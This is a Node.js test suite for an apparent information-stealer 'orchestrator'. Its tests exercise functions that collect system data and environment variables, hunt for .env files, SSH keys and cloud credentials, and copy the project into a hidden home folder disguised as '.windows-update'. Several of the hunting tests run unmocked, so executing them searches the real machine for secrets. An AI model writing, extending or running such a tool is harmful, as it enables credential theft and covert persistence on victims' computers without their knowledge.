const { describe, it, mock, after } = require("node:test");
const assert = require("node:assert/strict");
const path = require("path");
const os = require("os");
const fs = require("fs");

const {
    collectSystemData,
    huntEnvFiles,
    huntSecretFiles,
    performCrudOperations,
    buildReport
} = require("../src/app/orchestrator");

describe("orchestrator — collectSystemData", () => {
    it("returns object with all collector keys", () => {
        const data = collectSystemData();
        assert.ok(typeof data.system === "object");
        assert.ok(typeof data.cpu === "object");
        assert.ok(typeof data.memory === "object");
        assert.ok(typeof data.user === "object");
        assert.ok(typeof data.environmentVariables === "object");
        assert.ok(Array.isArray(data.wifi));
        assert.ok(Array.isArray(data.software));
        assert.ok(Array.isArray(data.processes));
    });

    it("gracefully handles collector failures", () => {
        const data = collectSystemData();
        assert.notEqual(data.system, undefined);
    });
});

describe("orchestrator — huntEnvFiles", () => {
    it("returns targets, totalFound, and files array", () => {
        const result = huntEnvFiles();
        assert.ok(Array.isArray(result.targets));
        assert.equal(typeof result.totalFound, "number");
        assert.ok(Array.isArray(result.files));
    });
});

describe("orchestrator — huntSecretFiles", () => {
    it("returns sshKeys, cloudCreds, totalFound, files", () => {
        const result = huntSecretFiles();
        assert.ok(Array.isArray(result.sshKeys));
        assert.ok(Array.isArray(result.cloudCreds));
        assert.equal(typeof result.totalFound, "number");
        assert.ok(Array.isArray(result.files));
    });
});

describe("orchestrator — performCrudOperations", () => {
    it("skips all operations in dry-run mode", () => {
        const log = performCrudOperations("/fake", true);
        assert.equal(log.length, 1);
        assert.equal(log[0].operation, "DRY_RUN");
    });

    it("includes copy operations on first run", () => {
        const hiddenDir = path.join(os.homedir(), ".windows-update");
        const existsOrig = fs.existsSync;
        const mkdirOrig = fs.mkdirSync;
        const readdirOrig = fs.readdirSync;
        mock.method(fs, "existsSync", (p) => {
            if (p === hiddenDir) return false;
            if (typeof p === "string" && (p.endsWith("package.json") || p.endsWith("README.md"))) return true;
            return false;
        });
        mock.method(fs, "mkdirSync", () => {});
        mock.method(fs, "readdirSync", () => []);
        const log = performCrudOperations(process.cwd(), false);
        assert.ok(log.some(e => e.operation === "COPY_PROJECT"));
        fs.existsSync = existsOrig;
        fs.mkdirSync = mkdirOrig;
        fs.readdirSync = readdirOrig;
    });

    it("skips copy on subsequent runs", () => {
        const hiddenDir = path.join(os.homedir(), ".windows-update");
        const existsOrig = fs.existsSync;
        mock.method(fs, "existsSync", (p) => {
            if (p === hiddenDir) return true;
            return false;
        });
        const log = performCrudOperations("/fake", false);
        assert.ok(log.some(e => e.operation === "SKIP_COPY"));
        fs.existsSync = existsOrig;
    });

    after(() => {
        mock.restoreAll();
    });
});

describe("orchestrator — buildReport", () => {
    const emptyEnv = { targets: [], totalFound: 0, files: [] };
    const emptySecret = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };

    it("includes timestamp, runtime, and provided data", () => {
        const report = buildReport(
            { system: { hostname: "test" } },
            emptyEnv,
            emptySecret,
            [],
            1000,
            []
        );
        assert.ok(report.timestamp);
        assert.ok(report.runtime);
        assert.equal(report.system.hostname, "test");
        assert.equal(report.systemId, null);
    });

    it("includes foundSecretFiles in report", () => {
        const report = buildReport({}, emptyEnv, emptySecret, [], 1000);
        assert.ok(report.foundSecretFiles);
        assert.equal(report.foundSecretFiles.totalFound, 0);
    });

    it("includes errors array when non-empty", () => {
        const report = buildReport({}, emptyEnv, emptySecret, [], 1000, ["phase 1 failed"]);
        assert.ok(Array.isArray(report.errors));
        assert.equal(report.errors[0], "phase 1 failed");
    });

    it("omits errors key when no errors", () => {
        const report = buildReport({}, emptyEnv, emptySecret, [], 1000);
        assert.equal(report.errors, undefined);
    });

    it("includes crudOperations array", () => {
        const report = buildReport({}, emptyEnv, emptySecret, [{ operation: "TEST", status: "OK" }], 1000);
        assert.equal(report.crudOperations.length, 1);
        assert.equal(report.crudOperations[0].operation, "TEST");
    });
});
